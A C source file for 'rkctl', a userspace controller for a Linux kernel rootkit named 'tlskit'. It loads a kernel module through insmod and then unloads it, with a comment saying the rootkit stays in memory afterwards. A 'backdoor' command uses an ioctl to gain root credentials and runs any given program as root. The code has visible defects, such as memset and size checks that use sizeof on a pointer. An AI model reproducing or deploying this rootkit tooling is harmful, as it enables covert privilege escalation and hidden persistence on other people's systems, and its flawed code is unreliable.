#include "shared.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

int do_ioctl_request(const char *desc, unsigned int request, void *data) {

    int fd;
    printf("[ ] rkctl do_ioctl_request: %s\n", desc);

    if (0 > (fd = open(IOCTL_FILE_PATH, O_RDWR))) {
        printf("[-] rkctl do_ioctl_request: Cannot open control file for ioctl\n");
        return -1;
    }

    if (0 > ioctl(fd, request, data)) {
        perror("[-] rkctl do_ioctl_request: ioctl() failed");
        return -1;
    }

    close(fd);

    printf("[+] rkctl do_ioctl_request: Done.\n");
    return 0;
}

int do_load(int argc, const char *argv[]) {

    const char *path;
    char *command;
    unsigned int len;

    printf("[ ] rkctl: load tlskit ...\n");

    /*
     * Check some conditions: root, args, not yet loaded
     */
    if (argc != 3) {
        printf("[-] rkctl: Wrong number of arguments\n");
        return -1;
    }

    if (geteuid() != 0) {
        printf("[-] rkctl: load must be run as root\n");
        return -1;
    }

    printf("[ ] rkctl: Check if tlskit is already installed ... (expect failure)\n");
    if (0 == do_ioctl_request("Ping", RKCTL_PING, NULL)) {
        printf("[-] rkctl: tlskit has already been loaded\n");
        return -1;
    }

    /*
     * Build command string
     */
    path = argv[2];
    len = strlen("insmod ") + strlen(path) + 1;
    if (NULL == (command = malloc(len))) {
        printf("[-] rkctl: cannot allocate memory\n");
        return -1;
    }

    memset(command, 0, sizeof(command));
    memcpy(command, "insmod ", strlen("insmod "));
    strcat(command, path);

    /*
     * Load module
     */
    printf("[ ] rkctl: Insert kernel module that will install the tlskit\n");
    if (0 > system(command)) {
        printf("[-] rkctl: cannot insert rootkit\n");
        goto err;
    }

    /*
     * Unload the module again, while the rootkit stays in the memory
     */
    len = strlen("rmmod ") + 1 + strlen(MODULE_NAME);
    if (sizeof(command) < len) {
        command = realloc(command, len);
        if (command == NULL) {
            goto err;
        }
    }
    memset(command, 0, sizeof(command));
    memcpy(command, "rmmod ", strlen("rmmod "));
    strcat(command, MODULE_NAME);

    /*
     * Unload module
     */
    printf("[ ] rkctl: Unload the kernel module\n");
    if (0 > system(command)) {
        printf("[-] rkctl: cannot remove kernel module\n");
        goto err;
    }

    printf("[+] rkctl: Done\n");

    return 0;

err:
    free(command);
    return -1;
}

int do_backdoor(int argc, const char *argv[]) {

    const char *cmd;

    if (argc < 3) {
        printf("[-] rkctl: missing command for execv\n");
        return -1;
    }

    /*
     * Request root credentials
     */
    if (0 != do_ioctl_request("backdoor", RKCTL_BACKDOOR, NULL) || getuid() != 0) {
        printf("[-] rkctl: privilege escalation failed\n");
        return -1;
    }

    /*
     * Execute command as root, if available
     */
    cmd = argv[2];
    execv(cmd, NULL);

    return 0;
}

int main(int argc, const char *argv[]) {

    char *endptr = NULL;
    const char *cmd;

    if (argc < 2) {
        printf("[-] rkctl: missing command\n");
    }

    cmd = argv[1];

    if (!(strcmp(cmd, "ping"))) {

        return do_ioctl_request("ping", RKCTL_PING, NULL);

    } else if (!strcmp(cmd, "load")) {

        return do_load(argc, argv);

    } else if (!strcmp(cmd, "unload")) {

        return do_ioctl_request("unload", RKCTL_UNLOAD, NULL);

    } else if (!strcmp(cmd, "backdoor")) {

        return do_backdoor(argc, argv);

    } else {
        printf("[-] rkctl: command not supported\n");
        return -1;
    }

}
